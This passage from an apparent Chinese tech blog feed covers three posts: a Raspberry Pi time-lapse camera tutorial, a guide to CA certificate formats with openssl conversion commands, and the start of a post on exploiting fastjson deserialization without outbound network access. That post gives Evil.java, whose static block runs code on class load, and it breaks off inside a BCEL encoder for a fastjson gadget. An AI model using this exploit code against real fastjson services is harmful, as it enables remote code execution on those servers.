的入口，我们可以下载奥梅分区助手快速格式化成想要的格式。</p></blockquote><p>使用命令查看固态硬盘是否被识别</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsusb</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/76/4cb337cb9adfa8619785660f5d34f3" alt="image"></p><p>可以看到，第二个usb设备便是我们的usb固态硬盘设备了（M.2硬盘放到了USB硬盘盒进行外接）</p><p>使用 fdisk 命令查看硬盘属性</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/ca/4ead62f47bef4459e3d406d8869cab" alt="image"></p><p>使用 mount 挂载硬盘设备，将磁盘挂载到 &#x2F;mnt&#x2F;sda1 路径下</p><p>虽然网上有很多教程说配置一个配置文件（具体配置我就不说了），然后让设备开机自动挂载，但我个人极不推荐，修改配置文件开机自动挂载虽然貌似一劳永逸，但在硬盘设备发生变更时，大概率因为忘记同步修改配置文件，会造成无法启动系统的严重故障，折腾不说还可能需要重装系统解决…其实启动不频繁情况下，手动装载也不费事。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda3 /mnt/sda1</span><br></pre></td></tr></table></figure><p>然后使用 df 命令查看存储占用详情</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/3b/84468b1d130947192a6af2f54e5eec" alt="image"></p><p>可以看到硬盘成功挂载。</p><h4 id="树莓派拍摄获取素材程序"><a href="#树莓派拍摄获取素材程序" class="headerlink" title="树莓派拍摄获取素材程序"></a>树莓派拍摄获取素材程序</h4><p>我们编写一个短小的python脚本来实现以下几点小功能：</p><ul><li>据时间归档目录</li><li>调用api执行拍照，并按时间戳命名</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    path = <span class="string">&#x27;/mnt/sda1&#x27;</span></span><br><span class="line">    <span class="comment"># path = &#x27;E:\code\Project.Python\CameraShoot&#x27;</span></span><br><span class="line">    folder = <span class="string">f&#x27;<span class="subst">&#123;path&#125;</span>/<span class="subst">&#123;time.strftime(<span class="string">&quot;%Y%m%d&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(folder):</span><br><span class="line">        os.mkdir(folder)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 拍照</span></span><br><span class="line">    os.system(</span><br><span class="line">        <span class="string">f&#x27;fswebcam -r 1920*1080 --delay 3 --skip 10 <span class="subst">&#123;folder&#125;</span>/<span class="subst">&#123;time.strftime(<span class="string">&quot;%Y%m%d%H%M%S&quot;</span>)&#125;</span>.jpg&#x27;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><h4 id="树莓派定时任务编写"><a href="#树莓派定时任务编写" class="headerlink" title="树莓派定时任务编写"></a>树莓派定时任务编写</h4><p>我们使用 linux 环境下的 crontab 编写定时任务，来定时执行拍照任务（初步定每分钟拍一张）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">* * * * * python /7tiny/camera_shoot.py</span><br></pre></td></tr></table></figure><p>采用定时任务，每分钟自动调度执行我们写好的python脚本，来进行拍照任务的执行</p><p>等待一段时间后，便可拿到拍摄素材…</p><p><img src="https://static.luozhinet.com/bf/98d9ef3a8b54c1fc38bd89e5893bf7" alt="image"></p><p><img src="https://static.luozhinet.com/3e/b29151741bc38c17762c7ac9681d08" alt="image"></p><h4 id="将素材图片合成视频"><a href="#将素材图片合成视频" class="headerlink" title="将素材图片合成视频"></a>将素材图片合成视频</h4><p>我们先简单从树莓派上下载下来拍摄好的图片，在 windows 上简单合成一个视频，完成我们的任务目标，后期可以根据需要在树莓派上自动合成。</p><p>我们用 ffmpeg 软件将图片合成为视频。</p><p>首先下载 ffmpeg 软件的 exe 版本（windows），linux上可直接下载linux版。</p><p>然后将解压后 ffmpeg 的 exe 目录添加到环境变量，方便我们执行命令。</p><p>将树莓派上的图片下载下来。</p><p><img src="https://static.luozhinet.com/0e/2087bb6f73079f8085b5de7fc1cc66" alt="image"></p><p>下载下来的图片我们是默认使用时间戳来命名图片的，因为ffmpeg只能从 0 - n 顺序识别图片，无法识别时间戳这种命名，因此，我这里自己编写了一个工具将图片名称替换成了 0 - n.jpg。</p><p>有需要的同学可以在文末获取到工具源码及下载地址。</p><p>重命名好后，我们执行命令压缩图片为 mp4 文件。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -r <span class="number">10</span> -f image2 -i %d.jpg -vcodec libx264 -pix_fmt yuv420p out.mp4</span><br></pre></td></tr></table></figure><p>同样我们介绍下使用的几个参数：</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-r 10</td><td>视频为每秒10帧，可以根据需要调整，10帧就是10张图片</td></tr><tr><td>%d</td><td>从0开始在当前目录递增寻找图片</td></tr><tr><td>-vcodec libx264（windows兼容）</td><td></td></tr><tr><td>-vcodec libx265（体积更小，windows默认不支持）</td><td>视频压缩参数</td></tr><tr><td>-pix_fmt yuv420p</td><td>视频编码格式（windows下播放兼容）</td></tr></tbody></table><p>执行后，我们便可查看到图片被拼接成为 mp4 格式的视频。</p><p><img src="https://static.luozhinet.com/e2/635305b8ad961ffad26395b53a4fc8" alt="image"></p><p><img src="https://static.luozhinet.com/c6/57431b6621e6f56c8c111dcae343ea" alt="image"></p><h2 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h2><p>本文通过短小的代码片段初步使用树莓派+usb摄像头进行环境捕捉，在此基础上，可以进行很多额外的场景扩展及使用优化。</p><h2 id="【源码地址】"><a href="#【源码地址】" class="headerlink" title="【源码地址】"></a>【源码地址】</h2><p>重命名工具源码及编译后绿色程序：<br><a href="https://github.com/sevenTiny/SevenTinyToolBox/blob/main/tools/SevenTinyToolBox.RenameWithNumber.exe">https://github.com/sevenTiny/SevenTinyToolBox/blob/main/tools/SevenTinyToolBox.RenameWithNumber.exe</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 文件 </tag>
+            
+            <tag> 变量 </tag>
+            
+            <tag> 格式 </tag>
+            
+            <tag> 程序 </tag>
+            
+            <tag> 地址 </tag>
+            
+            <tag> 素材 </tag>
+            
+            <tag> import </tag>
+            
+            <tag> 命令 </tag>
+            
+            <tag> 视频 </tag>
+            
+            <tag> 软件 </tag>
+            
+            <tag> sudo </tag>
+            
+            <tag> 代码 </tag>
+            
+            <tag> 图片 </tag>
+            
+            <tag> 同学 </tag>
+            
+            <tag> 空间 </tag>
+            
+            <tag> 录制 </tag>
+            
+            <tag> 树莓 </tag>
+            
+            <tag> usb </tag>
+            
+            <tag> ffmpeg </tag>
+            
+            <tag> 硬盘 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CA证书介绍与格式转换</title>
+      <link href="/posts/ebfeb636114e/"/>
+      <url>/posts/ebfeb636114e/</url>
+      
+        <content type="html"><![CDATA[<h1 id="CA证书介绍与格式转换"><a href="#CA证书介绍与格式转换" class="headerlink" title="CA证书介绍与格式转换"></a>CA证书介绍与格式转换</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>PKCS 公钥加密标准（Public Key Cryptography Standards, PKCS），此一标准的设计与发布皆由RSA资讯安全公司（英语：RSA Security）所制定，PKCS 目前共发布过 15 个标准。<a href="https://zh.m.wikipedia.org/zh-hans/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E5%AD%A6%E6%A0%87%E5%87%86" title="公钥密码学标准">更多公钥加密标准</a></p><p>X.509 是密码学里公钥证书的格式标准。</p><blockquote><p>X.509是常见通用的证书格式。是ITU-T标准化部门基于他们之前的ASN.1定义的一套证书标准。  </p><p>X.509附带了证书吊销列表和用于从最终对证书进行签名的证书签发机构直到最终可信点为止的证书合法性验证算法。  </p><p>X.509证书已应用在包括TLS&#x2F;SSL在内的众多网络协议里，同时它也用在很多非在线应用场景里。</p></blockquote><p>应用场景如电子签名服务。X.509证书里含有公钥、身份信息（比如网络主机名，组织的名称或个体名称等）和签名信息（可以是证书签发机构CA的签名，也可以是自签名）。</p><ol><li><p>常用加密标准：</p><ul><li>PKCS #7： 密码讯息语法标准（Cryptographic Message Syntax Standard），规范了以公开金钥基础设施（PKI）所产生之签章&#x2F;密文之格式。其目的一样是为了拓展数位证书的应用。</li><li>PKCS #10： 证书申请标准（Certification Request Standard），英语：PKCS_10，规范了向证书中心申请证书之CSR（certificate signing request）的格式。</li><li>PKCS #12： 个人讯息交换标准（Personal Information Exchange Syntax Standard），定义了包含私钥与公钥证书（public key certificate）的文件格式。私钥采密码(password)保护。常见的PFX就履行了PKCS#12。</li></ul></li><li><p>常用扩展名：</p><ul><li>PKCS#7格式： .P7B .P7C .SPC</li><li>PKCS#12格式： .P12 .PFX .PKCS12</li><li>JKS格式： .jks .keystore .truststore</li><li>.pem – 隐私增强型电子邮件（Privacy-enhanced Electronic Mail）格式，通常是Base64格式的。</li><li>.cer &#x2F;.crt &#x2F;.der – 通常是DER（X.690#DER_encoding）二进制格式的。</li><li>.cer &#x2F;.crt是用于存放证书，它是2进制形式存放的，不含私钥。</li><li>.p12 – PKCS#12格式，包含证书的同时可能还包含私钥</li><li>.pfx – PFX，PKCS#12之前的格式（通常用PKCS#12格式，比如由互联网资讯服务产生的PFX文件）</li><li>.pfx &#x2F;.p12 用于存放个人证书&#x2F;私钥，他通常包含保护密码，2进制方式。</li><li>.p7r 是CA对证书请求的回复，只用于导入。</li><li>.p7b 以树状展示证书链(certificate chain)，同时也支持单个证书，不含私钥。</li></ul></li></ol><h3 id="术语介绍"><a href="#术语介绍" class="headerlink" title="术语介绍"></a>术语介绍</h3><ol><li>密钥对： 在非对称加密技术中，有两种密钥，分为私钥和公钥。</li><li>公钥： 公钥用来给数据加密，用公钥加密的数据只能使用私钥解密，公钥是密钥对持有者公布给他人的。</li><li>私钥： 用来解密公钥加密的数据，私钥是密钥对所有者持有，不可公布。</li><li>摘要： 对需要传输的文本，做一个HASH计算，一般采用SHA1，SHA2来获得。</li><li>签名： 使用私钥对需要传输的文本的摘要进行加密，得到的密文即被称为该次传输过程的签名。</li><li>签名验证： 数据接收端，拿到传输文本，但是需要确认该文本是否就是发送发出的内容，中途是否曾经被篡改。因此拿自己持有的公钥对签名进行解密（密钥对中的一种密钥加密的数据必定能使用另一种密钥解密。），得到了文本的摘要，然后使用与发送方同样的HASH算法计算摘要值，再与解密得到的摘要做对比，发现二者完全一致，则说明文本没有被篡改过。</li><li>密钥分为两种： <code>对称密钥</code>与<code>非对称密钥</code><ol><li>对称密钥加密： 又称私钥加密或会话密钥加密算法，指的就是加、解密使用的同是一串密钥，所以被称做对称加密。它的最大优势是加&#x2F;解密速度快，适合于对大数据量进行加密，但密钥管理困难。</li><li>非对称密钥加密： 又称公钥密钥加密。指的是加、解密使用不同的密钥，一把作为公开的公钥，另一把作为私钥保存。公钥机制灵活，但加密和解密速度却比对称密钥加密慢得多。</li></ol></li></ol><p>Tips：</p><ul><li>密钥指的是私钥或者公钥 —&gt; 密钥 &#x3D; 私钥&#x2F;公钥；</li><li>密钥对指的是公钥加上私钥 —&gt; 密钥对 &#x3D; 私钥+公钥；</li><li>非对称加密：<ul><li>公钥和私钥是成对的，公钥和私钥唯一对应，它们互相解密。</li><li>公钥一般用来加密和验证签名，私钥用来签名和解密。</li><li>加密（加解密）： 公钥加密，私钥解密；加密的目的是保证信息的保密传输，使只有具备资格的一方才能解密。</li><li>认证（加验签）： 私钥数字签名，公钥验证签名；加签的目的是让收到消息的一方确认该消息是由特定方发送的。</li></ul></li><li>在实际的应用中，通常将两者结合在一起使用，例如，对称密钥加密系统用于存储大量数据信息，而公开密钥加密系统则用于加密密钥。</li></ul><p>原文链接：<a href="https://blog.csdn.net/qq_41586280/article/details/82669840">https://blog.csdn.net/qq_41586280&#x2F;article&#x2F;details&#x2F;82669840</a></p><h3 id="PEM-格式"><a href="#PEM-格式" class="headerlink" title="PEM 格式"></a>PEM 格式</h3><ol><li>PEM格式是证书颁发机构颁发证书的最常见格式.PEM证书通常具有扩展名，例如.pem，.crt，.cer和.key。</li><li>它们是以二进制文件的Base64编码的保存，包含“—– BEGIN CERTIFICATE —–”和“—– END CERTIFICATE —–”语句。</li><li>服务器证书，中间证书和私钥都可以放入PEM格式。</li><li>相较于PEM的Base64编码格式以文本文件的形式存在，<code>CERT格式</code>的文件为PEM的二进制格式，文件扩展名.cert &#x2F;.cer &#x2F;.crt。</li><li><code>KEY格式</code>通常用来存放公钥或者私钥，并非X.509证书，编码可能是PEM也有可能是DER，扩展名为 .key。</li></ol><p>Apache和其他类似服务器使用PEM格式证书。几个PEM证书，甚至私钥，可以包含在一个文件中，一个在另一个文件之下，但是大多数平台（例如Apache）希望证书和私钥位于单独的文件中。</p><h3 id="DER-格式"><a href="#DER-格式" class="headerlink" title="DER 格式"></a>DER 格式</h3><ol><li>DER格式只是证书的二进制形式，不含私钥。</li><li>文件扩展名通常是.cer，有时会有.der的文件扩展名。</li><li>判断DER .cer文件和PEM .cer文件方法是在文本编辑器中打开它，并查找BEGIN &#x2F; END语句。</li><li>所有类型的证书和私钥都可以用DER格式编码。</li><li>DER通常与Java平台一起使用。</li><li>SSL转换器只能将证书转换为DER格式。</li></ol><h3 id="PKCS＃7-x2F-P7B-格式"><a href="#PKCS＃7-x2F-P7B-格式" class="headerlink" title="PKCS＃7 &#x2F; P7B 格式"></a>PKCS＃7 &#x2F; P7B 格式</h3><ol><li>PKCS#7是签名或加密数据的格式标准，官方称之为容器。由于证书是可验真的签名数据，所以可以用SignedData结构表述。</li><li>PKCS#7或P7B格式通常以Base64 ASCII格式存储，文件扩展名为.p7b或.p7c。</li><li>P7B证书包含“—– BEGIN PKCS7 —–”和“—– END PKCS7 —–”语句。</li><li>P7B文件仅包含证书和链证书，而不包含私钥。</li><li>多个平台支持P7B文件，包括Microsoft Windows和Java Tomcat。</li></ol><h3 id="PKCS＃12-x2F-PFX-格式"><a href="#PKCS＃12-x2F-PFX-格式" class="headerlink" title="PKCS＃12 &#x2F; PFX 格式"></a>PKCS＃12 &#x2F; PFX 格式</h3><ol><li>PKCS#12 是公钥加密标准，通用格式（rsa公司标准）。规定了可包含所有私钥、公钥和证书。文件格式是加密过的。</li><li>PKCS#12 或 PFX 格式是其以二进制格式存储，也称为 PFX 文件，在windows中可以直接导入到密钥区。也可用于导入和导出证书和私钥。</li><li>PKCS#12 由 PFX 进化而来的，用于<code>交换公共的和私有的对象</code>的标准格式。</li><li>文件通常具有扩展名，例如.pkcs12 .pfx .p12。</li><li>密钥库和私钥用相同密码进行保护</li></ol><h3 id="JKS-格式"><a href="#JKS-格式" class="headerlink" title="JKS 格式"></a>JKS 格式</h3><ol><li>JKS是java用来存储密钥的容器。可以同时容纳n个公钥或私钥，后缀一般是.jks或者.keystore或.truststore等。</li><li>在Java 8之前，这些文件的默认格式为JKS(android .keystore 也是jsk格式的证书)。</li><li>从Java 9开始，默认的密钥库格式为PKCS12。</li><li>Android签名keystore文件也是jks格式，且1.8之后要求转换到p12格式。</li><li>JKS是二进制格式，同时包含证书和私钥，一般有密码保护，只能存储非对称密钥对（私钥 + x509公钥证书）。</li><li>当应用程序需要通过SSL &#x2F; TLS进行通信时，在大多数情况下将使用java keystore和java truststore。</li><li>密钥库和私钥用不同的密码进行保护</li></ol><p><strong>JKS和PKCS12之间的最大区别是JKS是Java专用的格式，而PKCS12是存储加密的私钥和证书的标准化且与语言无关的方式。</strong></p><h2 id="格式转换"><a href="#格式转换" class="headerlink" title="格式转换"></a>格式转换</h2><blockquote><p>OpenSSL是一个非常有用的开源命令行工具包，可用于 X.509 证书，证书签名请求（CSRs）和加密密钥。</p></blockquote><h3 id="查看证书"><a href="#查看证书" class="headerlink" title="查看证书"></a>查看证书</h3><ul><li><p>查看 PEM证书</p><blockquote><p>openssl x509 -text -noout -in CERTIFICATE.pem</p></blockquote></li><li><p>查看 DER证书</p><blockquote><p>openssl x509 -inder der -text -noout -in CERTIFICATE.der</p></blockquote></li><li><p>查看 CSR证书</p><blockquote><p>openssl req -text -noout -in mysite.csr</p></blockquote></li><li><p>查看 P7B证书</p><blockquote><p>openssl pkcs7 -inform der -in CERTIFICATE.p7b -print_certs -text</p></blockquote></li><li><p>查看 JKS证书</p><blockquote><p>keytool -list -rfc -keystore server.jks -storepass XXXXXX</p></blockquote></li></ul><h3 id="转换证书"><a href="#转换证书" class="headerlink" title="转换证书"></a>转换证书</h3><h4 id="转换-PEM证书（-pem-x2F-crt-x2F-cer）"><a href="#转换-PEM证书（-pem-x2F-crt-x2F-cer）" class="headerlink" title="转换 PEM证书（.pem &#x2F;.crt &#x2F;.cer）"></a>转换 PEM证书（.pem &#x2F;.crt &#x2F;.cer）</h4><ul><li><p>PEM to DER</p><blockquote><p>openssl x509 -outform der -in CERTIFICATE.pem -out CERTIFICATE.der</p></blockquote></li><li><p>PEM to P7B</p><blockquote><p>openssl crl2pkcs7 -nocrl -certfile CERTIFICATE.cer -certfile CACert.cer -out CERTIFICATE.p7b</p></blockquote></li><li><p>PEM to PFX</p><blockquote><p>openssl pkcs12 -export -out CERTIFICATE.pfx -inkey PRIVATEKEY.key -in CERTIFICATE.crt [-certfile CACert.crt]  </p><p>openssl pkcs12 -export -out CERTIFICATE.pfx -inkey PRIVATEKEY.key -in CERTIFICATE.cer [-certfile CACert.cer]  </p><p>openssl pkcs12 -export -out server.p12 -inkey server.key -in server.pem</p></blockquote></li></ul><h4 id="转换-DER证书（der-x2F-crt-x2F-cer）"><a href="#转换-DER证书（der-x2F-crt-x2F-cer）" class="headerlink" title="转换 DER证书（der &#x2F;.crt &#x2F;.cer）"></a>转换 DER证书（der &#x2F;.crt &#x2F;.cer）</h4><ul><li><p>DER to PEM</p><blockquote><p>openssl x509 -inform der -in CERTIFICATE.cer -out CERTIFICATE.pem</p></blockquote></li></ul><h4 id="转换-P7B证书（-p7b-x2F-p7c）"><a href="#转换-P7B证书（-p7b-x2F-p7c）" class="headerlink" title="转换 P7B证书（.p7b &#x2F;.p7c）"></a>转换 P7B证书（.p7b &#x2F;.p7c）</h4><ul><li><p>P7B to PEM</p><blockquote><p>openssl pkcs7 -print_certs -in CERTIFICATE.p7b -out CERTIFICATE.cer</p></blockquote></li><li><p>P7B to PFX</p><blockquote><p>openssl pkcs7 -print_certs -in CERTIFICATE.p7b -out CERTIFICATE.cer</p></blockquote></li></ul><h4 id="转换-PFX证书（-pkcs12-x2F-pfx-x2F-p12）"><a href="#转换-PFX证书（-pkcs12-x2F-pfx-x2F-p12）" class="headerlink" title="转换 PFX证书（.pkcs12 &#x2F;.pfx &#x2F;.p12）"></a>转换 PFX证书（.pkcs12 &#x2F;.pfx &#x2F;.p12）</h4><ul><li><p>PFX to PEM</p><blockquote><p>openssl pkcs12 -in CERTIFICATE.pfx -out CERTIFICATE.cer -nodes konwersja poprze OpenSSL  </p><p>openssl pkcs12 -nocerts -nodes -in cert.p12 -out private.pem  </p><p>openssl pkcs12 -clcerts -nokeys -in cert.p12 -out cert.pem</p></blockquote></li></ul><p>（PFX to PEM后CERTIFICATE.cer文件包含认证证书和私钥，需要把它们分开存储才能使用。）</p><h3 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a>常用选项</h3><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">-inform PEM|DER    输入格式 - DER或PEM（x509默认为PEM）</span><br><span class="line">-in infile         输入文件（x509默认为stdin）</span><br><span class="line">-outform PEM|DER   输出格式 - DER或PEM（x509默认为PEM）</span><br><span class="line">-out outfile       输出文件（x509默认为stdout）</span><br><span class="line">-keyform PEM|DER|ENGINE 私钥格式 - 默认PEM</span><br><span class="line">-passin val        私钥密码/口令来源</span><br><span class="line">-modulus           打印RSA密钥模数</span><br><span class="line">-pubkey            输出公钥</span><br><span class="line">-fingerprint       打印证书的指纹</span><br><span class="line">-alias             输出证书别名</span><br><span class="line">-noout             没有输出，只有状态</span><br><span class="line">-nocert            无证书输出</span><br><span class="line">-trustout          输出一个受信任的证书</span><br><span class="line">-setalias val      设置证书别名</span><br><span class="line">-days int          签署的证书到期前的时间 - 默认 30 天</span><br><span class="line">-signkey val       用参数自行签署证书</span><br><span class="line">-x509toreq         输出一个认证请求对象</span><br><span class="line">-req               输入是一个证书请求，签署并输出</span><br><span class="line">-CA infile         设置CA证书，必须是PEM格式</span><br><span class="line">-CAkey val         设置 CA 密钥，必须是 PEM 格式；如果不在 CAfile 中</span><br><span class="line">-text              打印文本形式的证书</span><br><span class="line">-ext val           打印各种X509V3扩展文件</span><br><span class="line">-extfile infile    要添加X509V3扩展的文件</span><br><span class="line">-writerand outfile 将随机数据写到指定文件中</span><br><span class="line">-extensions val    要使用的配置文件中的部分</span><br><span class="line">-nameopt val       各种证书名称选项</span><br><span class="line">-certopt val       各种证书文本选项</span><br><span class="line">-checkhost val     检查证书是否与主机匹配</span><br><span class="line">-checkemail val    检查证书是否与电子邮件匹配</span><br><span class="line">-checkip val       检查证书是否与ipaddr匹配</span><br><span class="line">-CAform PEM|DER    CA格式--默认PEM</span><br><span class="line">-CAkeyform PEM|DER|ENGINE      CA密钥格式--默认为PEM</span><br><span class="line"></span><br><span class="line">-export        输出PKCS12文件</span><br><span class="line">-nodes         不要加密私钥</span><br><span class="line">-nokeys        不输出私钥</span><br><span class="line">-keysig        设置 MS 密钥签名类型</span><br><span class="line">-nocerts       不输出证书</span><br><span class="line">-clcerts       只输出客户证书</span><br><span class="line">-cacerts       只输出CA证书</span><br><span class="line">-info          打印有关PKCS#12结构的信息</span><br><span class="line">-chain         添加证书链</span><br><span class="line">-certpbe val   证书PBE算法(默认为RC2-40)</span><br><span class="line">-inkey val     如果不是infile，则为私钥</span><br><span class="line">-certfile infile   从文件中加载证书</span><br><span class="line">-CApath dir    PEM格式的CA的目录</span><br><span class="line">-CAfile infile     PEM格式的CA的文件</span><br><span class="line">-no-CAfile     不加载默认的证书文件</span><br><span class="line">-no-CApath     不从默认的证书目录中加载证书</span><br></pre></td></tr></table></figure><p>Reference</p><ul><li><a href="https://csr.chinassl.net/convert-ssl-commands.html">https://csr.chinassl.net/convert-ssl-commands.html</a></li><li><a href="https://www.jianshu.com/p/87e3753c222b">https://www.jianshu.com/p/87e3753c222b</a></li><li><a href="http://mjpclab.site/linux/openssl-self-signed-certificate">http://mjpclab.site/linux/openssl-self-signed-certificate</a></li><li><a href="https://anymarvel.github.io/AndroidSummary/book/androidan-quan/Difference_keystores.html">https://anymarvel.github.io/AndroidSummary/book/androidan-quan/Difference_keystores.html</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 服务器 </tag>
+            
+            <tag> 文件 </tag>
+            
+            <tag> 对应 </tag>
+            
+            <tag> 格式 </tag>
+            
+            <tag> 网络 </tag>
+            
+            <tag> 隐私 </tag>
+            
+            <tag> 对象 </tag>
+            
+            <tag> 程序 </tag>
+            
+            <tag> 证书 </tag>
+            
+            <tag> 私钥 </tag>
+            
+            <tag> pem </tag>
+            
+            <tag> 公钥 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>fastjson不出网代码利用</title>
+      <link href="/posts/80682c2de722/"/>
+      <url>/posts/80682c2de722/</url>
+      
+        <content type="html"><![CDATA[<p><a href="https://img2022.cnblogs.com/blog/1943028/202205/1943028-20220527180816472-1802841958.png" rel="noopener"><img width="695" height="288" title="image" style="display: inline; background-image: none" alt="image" src="https://static.luozhinet.com/b8/0902008aabf52287bf3bb1e0176766" border="0"></a></p><p>只是做个记录</p><p>Evil.java</p><div class="cnblogs_code"><pre><span style="color: rgba(0, 0, 255, 1)">import</span> java.io.File;<span style="color: rgba(0, 0, 255, 1)">import</span> java.io.FileNotFoundException;<span style="color: rgba(0, 0, 255, 1)">import</span> java.io.FileOutputStream;<span style="color: rgba(0, 0, 255, 1)">import</span> java.io.IOException;<p><span style="color: rgba(0, 0, 255, 1)">public</span> <span style="color: rgba(0, 0, 255, 1)">class</span> Evil {<br><span style="color: rgba(0, 128, 0, 1)">&#x2F;&#x2F;    static {</span><br><span style="color: rgba(0, 128, 0, 1)">&#x2F;&#x2F;        try {</span><br><span style="color: rgba(0, 128, 0, 1)">&#x2F;&#x2F;            Runtime.getRuntime().exec(“calc.exe”);</span><br><span style="color: rgba(0, 128, 0, 1)">&#x2F;&#x2F;        } catch (Exception e) {</span><br><span style="color: rgba(0, 128, 0, 1)">&#x2F;&#x2F;            e.printStackTrace();</span><br><span style="color: rgba(0, 128, 0, 1)">&#x2F;&#x2F;        }</span><br><span style="color: rgba(0, 128, 0, 1)">&#x2F;&#x2F;    }</span><br>    <span style="color: rgba(0, 0, 255, 1)">static</span> {</p><pre><code>&lt;span style=&quot;color: rgba(0, 128, 0, 1)&quot;&gt;//win系统&lt;/span&gt;    String path = &quot;&lt;span style=&quot;color: rgba(139, 0, 0, 1)&quot;&gt;D:\\hello.txt&lt;/span&gt;&quot;;File file = &lt;span style=&quot;color: rgba(0, 0, 255, 1)&quot;&gt;new&lt;/span&gt; File(path);String content = &quot;&lt;span style=&quot;color: rgba(139, 0, 0, 1)&quot;&gt;hello,world.\n&lt;/span&gt;&quot;;FileOutputStream fileOutputStream = &lt;span style=&quot;color: rgba(0, 0, 255, 1)&quot;&gt;null&lt;/span&gt;;&lt;span style=&quot;color: rgba(0, 0, 255, 1)&quot;&gt;try&lt;/span&gt; &#123;    fileOutputStream = &lt;span style=&quot;color: rgba(0, 0, 255, 1)&quot;&gt;new&lt;/span&gt; FileOutputStream(file);&#125; &lt;span style=&quot;color: rgba(0, 0, 255, 1)&quot;&gt;catch&lt;/span&gt; (FileNotFoundException e) &#123;    e.printStackTrace();&#125;&lt;span style=&quot;color: rgba(0, 0, 255, 1)&quot;&gt;try&lt;/span&gt; &#123;    fileOutputStream.write(content.getBytes());&#125; &lt;span style=&quot;color: rgba(0, 0, 255, 1)&quot;&gt;catch&lt;/span&gt; (IOException e) &#123;    e.printStackTrace();&#125;&lt;span style=&quot;color: rgba(0, 0, 255, 1)&quot;&gt;try&lt;/span&gt; &#123;    fileOutputStream.close();&#125; &lt;span style=&quot;color: rgba(0, 0, 255, 1)&quot;&gt;catch&lt;/span&gt; (IOException e) &#123;    e.printStackTrace();&#125;</code></pre><p>}<br>}<br></pre></div></p><p>BCEL.java</p><div class="cnblogs_code"><pre><span style="color: rgba(0, 0, 255, 1)">import</span> com.sun.org.apache.bcel.internal.Repository;<span style="color: rgba(0, 0, 255, 1)">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<span style="color: rgba(0, 0, 255, 1)">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<span style="color: rgba(0, 0, 255, 1)">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;<p><span style="color: rgba(0, 0, 255, 1)">import</span> java.io.IOException;</p><p><span style="color: rgba(0, 0, 255, 1)">public</span> <span style="color: rgba(0, 0, 255, 1)">class</span> BCEL {<br>    <span style="color: rgba(0, 0, 255, 1)">public</span> <span style="color: rgba(0, 0, 255, 1)">static</span> <span style="color: rgba(0, 0, 255, 1)">void</span> main(String[] args) <span style="color: rgba(0, 0, 255, 1)">throws</span> IOException, ClassNotFoundException, IllegalAccessException, InstantiationException {<br>        JavaClass cls &#x3D; Repository.lookupClass(Evil.<span style="color: rgba(0, 0, 255, 1)">class</span>);<br>        String code &#x3D; 